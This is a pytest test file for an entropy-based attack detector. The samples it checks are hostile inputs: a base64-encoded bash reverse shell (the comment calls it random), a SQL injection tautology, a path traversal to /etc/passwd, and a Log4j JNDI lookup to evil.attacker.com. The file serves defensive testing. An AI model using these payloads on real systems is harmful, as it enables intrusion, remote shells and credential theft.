import pytest
from blackice.core.entropy import ShannonEntropyAnalyzer


def test_entropy_normal_text():
    analyzer = ShannonEntropyAnalyzer()
    res = analyzer.analyze("hello world, this is a standard human sentence with low entropy")
    assert res.shannon_entropy < 4.5
    assert not res.is_suspicious
    assert len(res.suspicious_patterns) == 0
    assert res.threat_score < 30


def test_entropy_obfuscated_high_entropy():
    analyzer = ShannonEntropyAnalyzer()
    # High-entropy random base64 string
    obfuscated = "aW1wb3J0IG9zCnN5c3RlbSgiYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDAmMScpCg=="
    res = analyzer.analyze(obfuscated)
    assert res.shannon_entropy >= 4.5
    assert res.is_suspicious


def test_entropy_dangerous_patterns_sqli():
    analyzer = ShannonEntropyAnalyzer()
    sqli = "admin' OR 1=1--"
    res = analyzer.analyze(sqli)
    assert res.is_suspicious
    assert "sqli_tautology" in res.suspicious_patterns
    assert res.threat_score >= 80


def test_entropy_dangerous_patterns_traversal():
    analyzer = ShannonEntropyAnalyzer()
    traversal = "/static/../../../../etc/passwd"
    res = analyzer.analyze(traversal)
    assert res.is_suspicious
    assert "path_traversal" in res.suspicious_patterns


def test_entropy_log4j_detection():
    analyzer = ShannonEntropyAnalyzer()
    jndi = "${jndi:ldap://evil.attacker.com:1389/Exploit}"
    res = analyzer.analyze(jndi)
    assert res.is_suspicious
    assert "log4j_jndi" in res.suspicious_patterns
    assert res.threat_score == 100


def test_entropy_empty_text():
    analyzer = ShannonEntropyAnalyzer()
    res = analyzer.analyze("")
    assert res.shannon_entropy == 0.0
    assert not res.is_suspicious
    assert res.threat_score == 0
